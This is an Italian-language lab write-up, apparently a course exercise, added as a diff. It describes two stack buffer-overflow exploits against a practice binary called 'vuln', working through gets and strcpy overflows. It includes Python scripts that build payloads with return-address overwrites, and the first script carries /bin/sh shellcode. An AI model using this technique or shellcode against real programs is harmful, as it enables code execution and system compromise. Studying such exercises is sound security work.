@@ -1,0 +1,73 @@
+# Primo exploit
+
+Le vulnerabilità sfruttate sono la seconda gets e la seconda strcpy della funzione get_input. Per scavalcare la prima gets si inserisce un carattere seguito da '\n'. Poi si sfrutta la gets(buffer1) per sovrascrivere il puntatore *buf con l'indirizzo della variabile globale string trovato col comando info variables di peda, inserendo 148 'a' per sovrascrivere string e matchare la condizione, e l'indirizzo di string. 
+Successivamente si sfrutta la strcpy(buf, buffer1) per sovrascrivere il return address con l'indirizzo della funzione vuln, trovato con peda con p vuln.
+
+Dopo aver costruito l'exploit ho inserito una stringa random creata con peda (pattern create 200 file) per trovare il padding al return address della funzione get_input, che è risultato 8. 
+Dopo essere entrata nella funzione vuln, per sfruttare la strcpy(buf,string) ho inserito un altro pattern random per trovare il nuovo padding per poter sovrascrivere il return address di vuln, che è risultato essere 4. 
+Ho inserito lo shellcode sotto il return address, che ho settato all'indirizzo di string + il numero di caratteri inseriti per la seconda gets + altri 4 interi per scavalcare il return address. 
+Ho chiamato col comando "cat badfile - | ./vuln " ed è partita la shell.
+
+Codice:
+
+ 
+import struct
+
+string = struct.pack("I", 0x0804a060)
+vuln = struct.pack("I", 0x804846b)
+shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")
+
+p = "A\n"
+
+p1 = "a"*148
+p1 += string
+p1 += "C"*8
+p1 += vuln
+p1 += "D"*4
+p1 += struct.pack("I", 0x0804a060 + len(p1) + 4)
+p1 += shellcode
+
+f = open("badfile", "w")
+f.write("%s" %(p + p1))
+f.close()
+
+
+# Secondo exploit
+
+Per il secondo exploit è necessario sfruttare entrambe le vulnerabilità della funzione get_input. Con la prima gets(buffer) si va a sovrascrivere il valore della variabile globale flagvalue, inserendo prima 0xdeadfeef, poi un pattern 
+per arrivare a 128 e riempire buffer, e infine l'indirizzo di flagvalue trovato con info variables di peda. 
+
+Si inserisce un '\n' e si crea il secondo pattern come descritto prima. 
+Alla fine però come ultimo return address dopo le D, si inserisce l'indirizzo della funzione flag, trovato con peda con il comando p flag. In questo modo si entra nella funzione flag, dove flagvalue sarà settato a deadfeef tramite la prima parte dell'exploit.
+
+Ho chiamato il programma col comando "cat badfile | ./vuln".
+
+Codice:
+
+
+import struct
+
+string = struct.pack("I", 0x0804a060)
+vuln = struct.pack("I", 0x804846b)
+
+flag = struct.pack("I", 0x80484ce)
+flagval = struct.pack("I", 0x0804a128)
+
+dead = struct.pack("I", 0xdeadfeef)
+
+
+p = dead
+p += "A"*(128 - len(p))
+p += flagval
+p += "\n"
+
+p1 = "a"*148
+p1 += string
+p1 += "C"*8
+p1 += vuln
+p1 += "D"*4
+p1 += flag
+
+f = open("badfile", "w")
+f.write("%s" %(p + p1))
+f.close()
